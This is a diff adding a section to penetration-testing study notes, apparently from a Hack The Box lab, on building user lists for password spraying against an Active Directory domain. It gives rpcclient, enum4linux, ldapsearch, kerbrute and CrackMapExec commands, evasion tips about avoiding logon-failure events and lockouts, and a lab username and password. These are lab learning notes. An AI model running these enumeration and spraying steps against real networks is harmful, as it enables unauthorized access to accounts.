@@ -12,6 +12,8 @@
         - [Remediation](#Remediation)
 - [Password Spraying](#password-spraying)
     - [Enumerating & Retrieving Password Policies](#enumerating--retrieving-password-policies)
+    - [Password Spraying - Making a Target User List](#password-spraying---making-a-target-user-list)
+
 
 
 
@@ -274,4 +276,68 @@ Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2
                  NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
 GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
 GPODisplayName : Default Domain Policy
+```
+
+### Password Spraying - Making a Target User List
+#### SMB NULL Session to Pull User List
+
+```bash
+# Using enum4linux
+enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+
+# Using rpcclient
+rpcclient -U "" -N 172.16.5.5
+
+rpcclient $> enumdomusers 
+user:[administrator] rid:[0x1f4]
+user:[guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[lab_adm] rid:[0x3e9]
+user:[htb-student] rid:[0x457]
+user:[avazquez] rid:[0x458]
+
+```
+- CrackMapExec
+    - This is a useful tool that will also show the badpwdcount (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. 
+    - It also shows the baddpwdtime, which is the date and time of the last bad password attempt, so we can see how close an account is to having its badpwdcount reset.
+    ```bash
+    # Using CrackMapExec --users Flag
+    crackmapexec smb 172.16.5.5 --users
+    ```
+
+#### Gathering Users with LDAP Anonymous
+```bash
+# Using ldapsearch
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+
+# Using windapsearch
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+
+
+```
+
+
+#### Enumerating Users with Kerbrute
+- This tool uses Kerberos Pre-Authentication, which is a much faster and potentially stealthier way to perform password spraying. 
+- This method does not generate Windows event ID 4625: An account failed to log on, or a logon failure which is often monitored for.
+- This method of username enumeration does not cause logon failures and will not lock out accounts.
+
+```bash
+# Kerbrute user enumeration
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+
+
+```
+
+- Using Kerbrute for username enumeration will generate event ID 4768: A Kerberos authentication ticket (TGT) was requested. This will only be triggered if Kerberos event logging is enabled via Group Policy.
+
+> [!IMPORTANT]
+> If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to mash up possible usernames from a company's LinkedIn page.
+
+
+#### Credentialed Enumeration to Build our User List
+```bash
+# Using CrackMapExec with Valid Credentials
+sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
+
 ```
